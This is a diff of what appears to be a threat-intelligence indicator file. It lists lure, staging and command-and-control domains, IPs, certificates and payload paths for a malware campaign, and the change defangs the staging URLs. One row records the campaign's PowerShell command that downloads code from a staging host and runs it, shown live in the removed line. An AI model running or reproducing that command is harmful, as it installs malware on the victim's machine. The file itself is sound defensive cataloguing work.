@@ -5,12 +5,12 @@ domain,quant-pro[.]com,2026-11-09,lure,malicious,high,analyst triage
 domain,quantai[.]app,2026-04-21,lure,malicious,high,Wayback Machine; analyst triage
 domain,quant-pro[.]ai,2026-11-09,lure,candidate,low,analyst triage
 domain,chartsgpt[.]com,2026-10-26,stage,malicious,high,urlscan.io; RDAP
-url,hxxps://chartsgpt.com/quant.php?Dio=<COMPUTERNAME>,2026-10-30,stage,malicious,high,urlscan.io; analyst triage
-url,hxxps://chartsgpt.com/ps.php,2026-11-09,stage,malicious,high,analyst triage
-url,hxxps://chartsgpt.com/ps2.php,2026-10-30,stage,malicious,high,urlscan.io
-url,hxxps://chartsgpt.com/boka.7z,2026-11-09,stage,malicious,high,analyst triage
-url,hxxps://chartsgpt.com/smow.7z,2026-11-09,stage,malicious,high,analyst triage
-url,hxxps://chartsgpt.com/vh.exe,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt[.]com/quant.php?Dio=<COMPUTERNAME>,2026-10-30,stage,malicious,high,urlscan.io; analyst triage
+url,hxxps://chartsgpt[.]com/ps.php,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt[.]com/ps2.php,2026-10-30,stage,malicious,high,urlscan.io
+url,hxxps://chartsgpt[.]com/boka.7z,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt[.]com/smow.7z,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt[.]com/vh.exe,2026-11-09,stage,malicious,high,analyst triage
 domain,sonosarcsounds[.]com,2026-06-15,c2,malicious,high,RDAP; config file
 domain,sonosarcsounds[.]net,2026-06-15,c2,malicious,high,RDAP; config file
 ipv4,192[.]69[.]210[.]252,2026-11-01,c2,malicious,high,Shodan
@@ -34,5 +34,5 @@ netsupport-licensee,NSM1234,2026-08-25,c2,malicious,med,licence file
 cert-cn,DESKTOP-VIG3E9V,2026-10-02,c2,candidate,low,Shodan
 cert-serial,25:59:22:98:98:22:5a:af:4d:71:14:de:05:b0:88:78,2026-10-02,c2,candidate,low,Shodan
 path,%LOCALAPPDATA%\Stoservice\stservice.exe,2026-11-09,payload,malicious,high,analyst triage
-command,"irm ""hxxps://chartsgpt.com/quant.php?Dio=$($env:COMPUTERNAME)"" | iex",2026-11-09,stage,malicious,high,analyst triage
+command,"irm ""hxxps://chartsgpt[.]com/quant.php?Dio=$($env:COMPUTERNAME)"" | iex",2026-11-09,stage,malicious,high,analyst triage
 ipv4,45[.]91[.]202[.]58,2026-11-10,c2,malicious,high,DNS resolution; check-host.net
